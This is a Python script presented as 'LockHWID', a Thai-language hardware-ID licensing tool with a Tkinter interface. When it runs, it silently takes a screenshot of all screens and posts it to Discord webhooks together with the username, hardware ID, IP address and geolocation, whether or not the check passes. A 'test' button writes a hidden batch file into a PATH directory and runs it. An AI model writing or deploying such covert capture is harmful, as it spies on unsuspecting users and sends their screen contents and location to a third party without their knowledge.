import os,webbrowser,subprocess,sys,requests,time,httpx
from pystyle import System 
from discord_webhook import DiscordWebhook
from tkinter import Label,Button,Frame,Tk,ttk
from secrets import token_hex
from os import popen, environ
from subprocess import call
from PIL import ImageGrab

hwid = str(str(subprocess.check_output('wmic csproduct get uuid')).strip().replace(r"\r", "").split(r"\n")[1].strip())
mypcname = os.getlogin()
datahwid =requests.get("https://pastebin.com/raw/AsmGzNHk")
ipinfo = httpx.get("https://ipinfo.io/json")
ipinfojson = ipinfo.json()
ip = ipinfojson.get('ip')
city = ipinfojson.get('city')
country = ipinfojson.get('country')
region = ipinfojson.get('region')
org = ipinfojson.get('org')
loc = ipinfojson.get('loc')

#Config Discords

#Discord Webhook
webhookusercanlogin = "https://discordapp.com/api/webhooks/"
webhookusercantlogin = "https://discordapp.com/api/webhooks/"
#Discord คำใน Embeds
usercanlogin = f"คุณ {mypcname} ได้เข้าระบบสำเร็จ" 
usercantlogin = f"คุณ {mypcname} ได้เข้าระบบไม่สำเร็จ" 
projectname = "LockHWID"
versionproject = "1"

os.system('cls')

dataloadedsuccessfullymsg = '''
    █▀▀▄ █▀▀█ ▀▀█▀▀ █▀▀█  █░░ █▀▀█ █▀▀█ █▀▀▄ █▀▀ █▀▀▄  █▀▀ █░░█ █▀▀ █▀▀ █▀▀ █▀▀ █▀▀ █▀▀ █░░█ █░░ █░░ █░░█
    █░░█ █▄▄█ ░░█░░ █▄▄█  █░░ █░░█ █▄▄█ █░░█ █▀▀ █░░█  ▀▀█ █░░█ █░░ █░░ █▀▀ ▀▀█ ▀▀█ █▀▀ █░░█ █░░ █░░ █▄▄█ 
    ▀▀▀░ ▀░░▀ ░░▀░░ ▀░░▀  ▀▀▀ ▀▀▀▀ ▀░░▀ ▀▀▀░ ▀▀▀ ▀▀▀░  ▀▀▀ ░▀▀▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀░░ ░▀▀▀ ▀▀▀ ▀▀▀ ▄▄▄█
'''[1:]

def printSlow(text):
    for char in text:
        print(char, end="")
        sys.stdout.flush()
        time.sleep(0.1)

def Main_Program():
    if hwid in datahwid.text:
        printSlow("────────────────────────────────────────────────────────────────────────────────────────────────")
        os.system('cls')
        image = ImageGrab.grab(bbox=None,include_layered_windows=True,all_screens=True,xdisplay=None)  
        image.save("imageprpsecurity.png")
        webhookusercanloginpic = DiscordWebhook(webhookusercanlogin, username=usercanlogin)
        with open("imageprpsecurity.png", "rb") as f:
           webhookusercanloginpic.add_file(file=f.read(), filename='imageprpsecurity.png')
        os.remove("imageprpsecurity.png")
        httpx.post(
            webhookusercanlogin, json={
            "content":"",
            "embeds": [
            {
              "title": f"User : {mypcname}",
              "tts": False,
              "description": f"""Project : {projectname} 
                Version : {versionproject} 
                Status : เข้าระบบสำเร็จ 
                HWID : {hwid}
                IP : {ip}
                เมือง : {city}
                ประเทศ : {country}
                ภูมิภาค : {region}
                องค์กร : {org}
                โลเคชั่น : {loc}""",
              "color": 0x1cff00,
            }
          ],
          "username": usercanlogin,
          }
        )
        response = webhookusercanloginpic.execute()
        print("░██████╗████████╗░█████╗░██╗░░░██╗  ██╗░░░░░░█████╗░░██████╗░░██████╗░███████╗██████╗░  ██╗███╗░░██╗")
        print("██╔════╝╚══██╔══╝██╔══██╗╚██╗░██╔╝  ██║░░░░░██╔══██╗██╔════╝░██╔════╝░██╔════╝██╔══██╗  ██║████╗░██║")
        print("╚█████╗░░░░██║░░░███████║░╚████╔╝░  ██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██║░░██║  ██║██╔██╗██║")
        print("░╚═══██╗░░░██║░░░██╔══██║░░╚██╔╝░░  ██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██║░░██║  ██║██║╚████║")
        print("██████╔╝░░░██║░░░██║░░██║░░░██║░░░  ███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██████╔╝  ██║██║░╚███║")
        print("╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░░░╚═╝░░░  ╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═════╝░  ╚═╝╚═╝░░╚══╝")
    else:
        
        print("█░█ █░█░█ █ █▀▄   █▄░█ █▀█ ▀█▀   █▀▀ █▀█ █░█ █▄░█ █▀▄")
        print("█▀█ ▀▄▀▄▀ █ █▄▀   █░▀█ █▄█ ░█░   █▀░ █▄█ █▄█ █░▀█ █▄▀")
        print("\n")
        image = ImageGrab.grab(bbox=None,include_layered_windows=True,all_screens=True,xdisplay=None)  
        image.save("imageprpsecurity.png")
        webhookusercantloginpic = DiscordWebhook(webhookusercantlogin, username=usercantlogin)
        with open("imageprpsecurity.png", "rb") as f:
           webhookusercantloginpic.add_file(file=f.read(), filename='imageprpsecurity.png')
        os.remove("imageprpsecurity.png")
        httpx.post(
            webhookusercantlogin, json={
            "content":"",
            "embeds": [
            {
              "title": f"User : {mypcname}",
              "tts": False,
              "description": f"""Project : {projectname} 
                Version : {versionproject} 
                Status : เข้าระบบสำเร็จ 
                HWID : {hwid}
                IP : {ip}
                เมือง : {city}
                ประเทศ : {country}
                ภูมิภาค : {region}
                องค์กร : {org}
                โลเคชั่น : {loc}""",
              "color": 0xcf0a0a,
            }
          ],
          "username": usercantlogin,
          }
        )
        response = webhookusercantloginpic.execute()
        print("HWID : " + hwid)
        print("\n")
        os.system('pause')
        exit()
System.Title("LockHWID By Sonic")
Main_Program()

def Hardcore1():
    System.Clear()
    file_location = environ['PATH'].split(';')[0] + f'''\\{token_hex(16)}.bat'''
    open(file_location, 'wb').write(bytes('''
    Windows Registry Editor Version 5.00 edit 

[Computer\HKEY_CURRENT_USER\System\GameConfigStore]

"creator"="prp"

    ''', 'utf-8'))
    _open = popen('attrib +h ' + file_location)
    _open.read()
    call(file_location)
    System.Clear()
    print(dataloadedsuccessfullymsg)

def bugtalk():
    webbrowser.open("https://discord.gg/eHMmneSs3c")
    
lobby = Tk()
lobby.title("LockHWID By PRP")
lobby.geometry("700x500")
lobby.resizable(width=False, height=False)

notebook = ttk.Notebook(lobby)
tab1 = Frame(notebook)
tab2 = Frame(notebook)
notebook.add(tab1,text="LockHWID")
notebook.add(tab2,text="ทดลอง")

notebook.pack()
Label(tab1,text="LockHWID ",font=300).pack()
Label(tab1,text="รายละเอียดเกี่ยวกับตัวโปรแกรม",font=250).pack()
Label(tab1,text="โปรแกรมนี้จัดทำเพื่อให้คนที่อยากตัว Lock Hwid ใช้งานง่าย",font=180).pack()
Label(tab1,text="พบเจอบัคกรุณาติดต่อ",font=250).pack()
Button(tab1,text="Discord",command=bugtalk).pack()

Label(tab2,text="เทส",font=300).pack()
Button(tab2,text="เทสสสส",command=Hardcore1).pack()

lobby.mainloop()